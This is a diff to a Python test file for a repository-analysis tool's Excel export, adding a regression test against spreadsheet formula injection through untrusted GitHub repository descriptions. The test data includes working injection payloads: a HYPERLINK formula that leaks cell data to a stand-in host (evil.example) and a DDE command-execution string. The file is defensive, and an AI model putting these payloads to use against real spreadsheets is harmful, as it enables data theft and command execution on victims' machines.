@@ -51,16 +51,18 @@ def make_ready_run(db_session, **repo_overrides):
         name="hello-world",
         source_url="https://github.com/octocat/hello-world",
         metadata=RepositoryMetadata(
-            repository_id="123456",
-            name="hello-world",
-            owner="octocat",
-            description="My first repository",
-            default_branch="main",
-            visibility="public",
-            primary_language="Python",
-            stargazers_count=42,
-            forks_count=7,
-            **repo_overrides,
+            **{
+                "repository_id": "123456",
+                "name": "hello-world",
+                "owner": "octocat",
+                "description": "My first repository",
+                "default_branch": "main",
+                "visibility": "public",
+                "primary_language": "Python",
+                "stargazers_count": 42,
+                "forks_count": 7,
+                **repo_overrides,
+            }
         ),
     )
     run = create_analysis_run(
@@ -190,6 +192,37 @@ def test_non_ready_run_raises_analysis_not_ready(db_session):
 
     with pytest.raises(AnalysisNotReadyError):
         build_repository_workbook(db_session, repository_id=repository.id, analysis_run_id=run.id)
+
+
+# ---- Regression: CSV/Excel formula injection via untrusted repo data ----
+# repository.description is free text entirely controlled by whoever owns
+# the GitHub repo being analyzed -- no character restrictions. openpyxl
+# treats any string cell value starting with '=' (also '+', '-', '@') as a
+# live formula, not plain text (see app/reporting/excel_export.py). Without
+# sanitization, a malicious repository description becomes an executable
+# formula the moment someone opens the exported workbook in Excel.
+
+
+@pytest.mark.parametrize(
+    "malicious_description",
+    [
+        '=HYPERLINK("http://evil.example/steal?x="&A1,"Click me")',
+        "=cmd|'/c calc'!A1",
+        "+1+1",
+        "-1+1",
+        "@SUM(1+1)",
+    ],
+)
+def test_malicious_description_never_becomes_a_live_formula_cell(db_session, malicious_description):
+    repository, run = make_ready_run(db_session, description=malicious_description)
+
+    workbook = build_repository_workbook(db_session, repository_id=repository.id, analysis_run_id=run.id)
+
+    sheet = workbook["Repository"]
+    description_cell = next(row[1] for row in sheet.iter_rows(min_row=2) if row[0].value == "Description")
+
+    assert description_cell.data_type != "f"  # never stored as a formula
+    assert description_cell.value == "'" + malicious_description  # visible as inert text
 
 
 def test_run_belonging_to_different_repository_is_rejected(db_session):
